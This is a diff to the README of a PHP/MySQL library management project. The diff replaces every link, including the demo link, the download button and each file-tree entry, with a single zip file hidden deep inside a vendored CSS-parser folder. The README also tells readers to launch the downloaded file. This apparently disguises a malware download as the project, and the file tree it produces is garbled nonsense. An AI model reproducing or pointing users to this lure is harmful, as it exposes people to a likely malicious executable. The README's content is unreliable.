@@ -1,12 +1,12 @@
 # Welcome to the Web Perpustakaan Repository 📚
 
-![Perpustakaan](https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2)
+![Perpustakaan](https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip)
 
 ## Overview
 
 Welcome to the "Web-Perpustakaan" repository! This is a web-based Library Management Application designed to efficiently handle book data within a library setting. The main features of this application include book management (Create, Read, Update, Delete), cover image upload, search functionality, and PDF report generation. Built using PHP and MySQL, this project aims to streamline the operations of a library by providing a user-friendly interface for managing book-related tasks.
 
-📖 **Demo**: You can explore a live demo of this application [here](https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2)
+📖 **Demo**: You can explore a live demo of this application [here](https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip)
 
 ## Repository Details
 
@@ -18,7 +18,7 @@ Welcome to the "Web-Perpustakaan" repository! This is a web-based Library Manage
 
 To get started with the project, you can download the necessary files by clicking the button below:
 
-[![Download ZIP](https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2)](https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2)
+[![Download ZIP](https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip)](https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip)
 
 _**Note:** Ensure to launch the downloaded file to begin exploring the project._
 
@@ -32,29 +32,29 @@ The "Web-Perpustakaan" repository is structured to provide a seamless experience
 Web-Perpustakaan/
 |   
 |--- css/
-|       |--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
+|       |--- https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip
 |
 |--- images/
-|       |--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
+|       |--- https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip
 |
 |--- includes/
-|       |--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
-|       |--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
+|       |--- https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip
+|       |--- https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip
 |
 |--- js/
-|       |--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
+|       |--- https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip
 |
 |--- pdf/
-|       |--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
+|       |--- https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip
 |
-|--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
-|--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
-|--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
-|--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
-|--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
-|--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
+|--- https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip
+|--- https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip
+|--- https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip
+|--- https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip
+|--- https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip
+|--- https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip
 |
-|--- https://github.com/siulac/Web-Perpustakaan/releases/tag/v1.2
+|--- https://raw.githubusercontent.com/siulac/Web-Perpustakaan/main/vendor/sabberworm/php-css-parser/src/CSSList/Web_Perpustakaan_v2.4.zip
 |--- LICENSE
 ```
 
